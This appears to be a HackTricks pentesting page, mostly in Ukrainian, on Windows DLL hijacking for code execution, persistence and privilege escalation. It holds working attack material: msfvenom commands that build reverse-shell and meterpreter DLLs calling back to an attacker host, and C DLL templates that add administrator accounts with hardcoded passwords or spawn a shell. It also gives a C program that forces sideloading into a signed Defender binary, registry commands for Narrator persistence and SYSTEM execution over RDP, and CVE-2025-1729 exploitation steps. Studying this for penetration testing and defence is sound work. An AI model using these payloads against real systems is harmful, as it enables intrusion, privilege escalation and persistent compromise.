# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Основна інформація

DLL Hijacking полягає у маніпулюванні довіреною програмою, щоб вона завантажила шкідливий DLL. Цей термін охоплює кілька тактик, таких як **DLL Spoofing, Injection, and Side-Loading**. Він в основному використовується для виконання коду, досягнення persistence і, рідше, privilege escalation. Незважаючи на акцент на escalation тут, метод захоплення залишається послідовним для різних цілей.

### Поширені методи

Кілька підходів застосовуються для DLL hijacking, і їх ефективність залежить від стратегії завантаження DLL конкретного додатку:

1. **DLL Replacement**: Замінити справжній DLL на шкідливий, опціонально використовуючи DLL Proxying для збереження функціональності оригінального DLL.
2. **DLL Search Order Hijacking**: Розмістити шкідливий DLL у шляху пошуку, що перевищує легітимний, експлуатуючи шаблон пошуку додатку.
3. **Phantom DLL Hijacking**: Створити шкідливий DLL для додатку, який намагається завантажити неіснуючий обов’язковий DLL.
4. **DLL Redirection**: Змінити параметри пошуку, такі як %PATH% або `.exe.manifest` / `.exe.local` файли, щоб перенаправити додаток до шкідливого DLL.
5. **WinSxS DLL Replacement**: Замінити легітимний DLL на шкідливий у WinSxS directory, метод часто пов’язаний з DLL side-loading.
6. **Relative Path DLL Hijacking**: Помістити шкідливий DLL у контрольовану користувачем папку разом зі скопійованим додатком, схоже на техніки Binary Proxy Execution.

## Пошук відсутніх DLL

Найпоширеніший спосіб знайти відсутні DLL у системі — запустити [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) зі Sysinternals, **встановивши** **наступні 2 фільтри**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

і просто показати **File System Activity**:

![](<../../../images/image (153).png>)

Якщо ви шукаєте **відсутні dll у загальному випадку**, залиште це запущеним на кілька **секунд**.\
Якщо ви шукаєте **відсутній dll всередині конкретного виконуваного файлу**, слід додати **ще один фільтр, наприклад "Process Name" "contains" `<exec name>`, виконати його та зупинити захоплення подій**.

## Експлуатація відсутніх DLL

Щоб підвищити привілеї, найкращий шанс — мати можливість **записати dll, який процес з вищими привілеями намагатиметься завантажити**, у одному з **місць, де його шукатимуть**. Таким чином ми можемо **записати** dll у **папку**, де **dll шукають раніше**, ніж у папці з **оригінальним dll** (дивний випадок), або ми можемо **записати у папку, де dll шукатиметься**, і оригінальний **dll не існує** в жодній папці.

### Dll Search Order

У [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) можна знайти деталі про те, як саме завантажуються Dll.

Програми Windows шукають DLL, дотримуючись набору попередньо визначених шляхів пошуку у певній послідовності. Проблема DLL hijacking виникає, коли шкідливий DLL стратегічно розміщено в одному з цих каталогів, гарантуючи, що він завантажиться раніше за автентичний DLL. Рішення для запобігання цьому — переконатися, що додаток використовує абсолютні шляхи при вказанні потрібних DLL.

Нижче наведено **порядок пошуку DLL у 32-бітних** системах:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Це **типовий** порядок пошуку при увімкненому **SafeDllSearchMode**. Коли він вимкнений, поточний каталог піднімається на друге місце. Щоб вимкнути цю опцію, створіть реєстрове значення **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** і встановіть його в 0 (за замовчуванням увімкнено).

Якщо функцію [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) викликають з **LOAD_WITH_ALTERED_SEARCH_PATH**, пошук починається у каталозі виконуваного модуля, який завантажує **LoadLibraryEx**.

Нарешті, зверніть увагу, що **dll може бути завантажений із вказаним абсолютним шляхом, а не лише за ім’ям**. У такому випадку цей dll буде шукатися **тільки у вказаному шляху** (якщо dll має залежності, вони будуть шукатися так, ніби були щойно завантажені за іменем).

Існують й інші способи змінити порядок пошуку, але я не буду пояснювати їх тут.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Просунутий спосіб детерміновано вплинути на шлях пошуку DLL для новоствореного процесу — встановити поле DllPath у RTL_USER_PROCESS_PARAMETERS під час створення процесу з нативними API ntdll. Якщо тут вказати керований зловмисником каталог, цільовий процес, який вирішує імпортований DLL за ім’ям (без абсолютного шляху і без використання безпечних прапорів завантаження), можна примусити завантажити шкідливий DLL з цього каталогу.

Ключова ідея
- Побудуйте параметри процесу за допомогою RtlCreateProcessParametersEx і вкажіть власний DllPath, що вказує на вашу контрольовану папку (наприклад, директорію, де знаходиться ваш dropper/unpacker).
- Створіть процес за допомогою RtlCreateUserProcess. Коли цільовий бінарний файл вирішуватиме DLL за іменем, завантажувач врахує наданий DllPath під час розв’язання, дозволяючи надійне sideloading навіть коли шкідливий DLL не знаходиться поруч із цільовим EXE.

Примітки/обмеження
- Це впливає на дочірній процес, що створюється; це відрізняється від SetDllDirectory, який впливає лише на поточний процес.
- Цільовий процес повинен імпортувати або LoadLibrary DLL за іменем (без абсолютного шляху і без використання LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs і жорстко закодовані абсолютні шляхи не можна підмінити. Forwarded exports і SxS можуть змінювати пріоритети.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- Place a malicious xmllite.dll (exporting the required functions or proxying to the real one) in your DllPath directory.
- Launch a signed binary known to look up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads your DLL.

This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory.


#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Escalating Privileges

**Requirements**:

- Identify a process that operates or will operate under **different privileges** (horizontal or lateral movement), which is **lacking a DLL**.
- Ensure **write access** is available for any **directory** in which the **DLL** will be **searched for**. This location might be the directory of the executable or a directory within the system path.

Так, вимоги важко знайти, оскільки **за замовчуванням досить дивно знайти привілейований виконуваний файл без dll** і ще **більш дивно мати права запису в папці в системному шляху** (ви не можете це робити за замовчуванням). Але в неправильно налаштованих середовищах це можливо.\
У випадку, якщо вам пощастило і ви відповідаєте вимогам, перевірте проект [UACME](https://github.com/hfiref0x/UACME). Навіть якщо **головна мета проєкту — bypass UAC**, ви можете знайти там **PoC** Dll hijaking для версії Windows, який можна використати (ймовірно, просто змінивши шлях папки, у якій у вас є права запису).

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
І **перевірте дозволи всіх папок у PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Ви також можете перевірити imports executable і exports dll за допомогою:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Для повного посібника про те, як **зловживати Dll Hijacking для ескалації привілеїв** за наявності прав запису в **System Path folder**, перегляньте:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Автоматизовані інструменти

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)перевірить, чи маєте ви права запису в будь-якій папці в system PATH.\
Інші цікаві автоматизовані інструменти для виявлення цієї вразливості — це **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ та _Write-HijackDll_.

### Приклад

Якщо ви знайдете експлуатований сценарій, однією з найважливіших речей для успішного використання буде **створити dll, яка експортує принаймні всі функції, які виконуваний файл імпортуватиме з неї**. Зверніть увагу, що Dll Hijacking корисний для [ескалації з рівня Medium Integrity до High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) або з [**High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Ви можете знайти приклад **як створити валідну dll** в цьому дослідженні з dll hijacking, орієнтованому на виконання: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Крім того, в **наступному розділі** ви знайдете деякі **базові коди dll**, які можуть бути корисними як **шаблони** або для створення **dll з експортом необов'язкових функцій**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

По суті, **Dll proxy** — це Dll, здатна **виконувати ваш шкідливий код під час завантаження**, але також **експонувати** та **працювати як очікується**, перенаправляючи всі виклики до реальної бібліотеки.

За допомогою інструменту [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) або [**Spartacus**](https://github.com/Accenture/Spartacus) ви можете фактично **вказати виконуваний файл і вибрати бібліотеку**, яку хочете proxify, і **згенерувати proxified dll** або **вказати Dll** і **згенерувати proxified dll**.

### **Meterpreter**

**Отримати rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Отримати meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Створити користувача (x86 — я не бачив версії для x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Ваш власний

Зверніть увагу, що в кількох випадках DLL, яку ви компілюєте, має **export several functions**, які будуть завантажені процесом-жертвою. Якщо таких функцій немає, **binary won't be able to load** їх, і **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL приклад створення користувача</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Альтернативна DLL на C з точкою входу потоку</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Практичний приклад: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe досі перевіряє передбачувану, залежну від мови локалізаційну DLL при запуску, яку можна підхопити для виконання довільного коду та забезпечення персистенції.

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Start Narrator and observe the attempted load of the above path.

Мінімальна DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC тиша
- Наївне hijack показуватиме/виділятиме UI. Щоб залишатися тихо, при attach перераховуйте потоки Narrator, відкрийте головний потік (`OpenThread(THREAD_SUSPEND_RESUME)`) і `SuspendThread` його; продовжуйте у власному потоці. Див. PoC для повного коду.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- З наведеним вище запуск Narrator завантажує підкладений DLL. На secure desktop (екран входу) натисніть CTRL+WIN+ENTER, щоб запустити Narrator.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP до хоста, на екрані входу натисніть CTRL+WIN+ENTER, щоб запустити Narrator; ваш DLL виконається як SYSTEM на secure desktop.
- Виконання припиняється, коли RDP-сеанс закривається — inject/migrate оперативно.

Bring Your Own Accessibility (BYOA)
- Ви можете клонувати вбудований запис Accessibility Tool (AT) у реєстрі (наприклад, CursorIndicator), відредагувати його так, щоб вказувати на довільний бінарний файл/DLL, імпортувати його, а потім встановити `configuration` на цю назву AT. Це проксує довільне виконання в рамках Accessibility.

Notes
- Запис у `%windir%\System32` та зміна значень HKLM вимагають прав admin.
- Вся логіка payload може жити в `DLL_PROCESS_ATTACH`; експорти не потрібні.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Цей кейс демонструє **Phantom DLL Hijacking** в Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), відстежується як **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` розташований за адресою `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` запускається щодня о 9:30 під контекстом залогіненого користувача.
- **Directory Permissions**: Записуваний для `CREATOR OWNER`, що дозволяє локальним користувачам кидати довільні файли.
- **DLL Search Behavior**: Спроба завантажити `hostfxr.dll` з робочого каталогу першою і логування "NAME NOT FOUND" якщо відсутній, вказує на пріоритет пошуку в локальному каталозі.

### Exploit Implementation

Атакуючий може помістити шкідливий stub `hostfxr.dll` в той самий каталог, експлуатуючи відсутню DLL, щоб досягти code execution під контекстом користувача:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Хід атаки

1. Як звичайний користувач, помістіть `hostfxr.dll` у `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Чекайте, поки заплановане завдання не буде виконане о 9:30 ранку в контексті поточного користувача.
3. Якщо адміністратор увійшов у систему під час виконання завдання, шкідливий DLL запускається в сесії адміністратора з середнім рівнем цілісності.
4. Комбінуйте стандартні UAC bypass techniques, щоб підняти привілеї зі середнього рівня цілісності до SYSTEM.

## Кейс: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Зловмисники часто поєднують MSI-based droppers із DLL side-loading, щоб виконувати payload у межах довіреного, підписаного процесу.

Chain overview
- Користувач завантажує MSI. CustomAction виконується тихо під час GUI-інсталяції (наприклад, LaunchApplication або VBScript action), відновлюючи наступний етап із вбудованих ресурсів.
- Dropper записує легітимний, підписаний EXE та шкідливий DLL у той самий каталог (наприклад: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Коли підписаний EXE запускається, порядок пошуку DLL у Windows спочатку завантажує wsc.dll з робочого каталогу, виконуючи код атакуючого під підписаним батьківським процесом (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Шукайте записи, які запускають виконувані файли або VBScript. Приклад підозрілої схеми: LaunchApplication, що виконує вбудований файл у фоні.
- У Orca (Microsoft Orca.exe) перевірте таблиці CustomAction, InstallExecuteSequence і Binary.
- Вбудовані/розділені payload у MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Шукайте численні невеликі фрагменти, які об'єднуються та дешифруються VBScript CustomAction. Типовий потік:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Помістіть ці два файли в ту саму папку:
- wsc_proxy.exe: легітимний підписаний хост (Avast). Процес намагається завантажити wsc.dll за іменем зі своєї директорії.
- wsc.dll: attacker DLL. Якщо не потрібні специфічні exports, DllMain достатній; інакше створіть proxy DLL і переспрямуйте необхідні exports до оригінальної бібліотеки, запускаючи payload у DllMain.
- Створіть мінімальний DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Для вимог щодо експорту використовуйте proxying framework (наприклад, DLLirant/Spartacus) щоб згенерувати forwarding DLL, яка також виконує ваш payload.

- Ця техніка покладається на розв'язання імен DLL бінарним файлом хоста. Якщо хост використовує абсолютні шляхи або прапори безпечного завантаження (наприклад, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack може не спрацювати.
- KnownDLLs, SxS, and forwarded exports можуть впливати на пріоритет і повинні враховуватися при виборі бінарного файлу хоста та набору експортів.

## Посилання

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)


{{#include ../../../banners/hacktricks-training.md}}
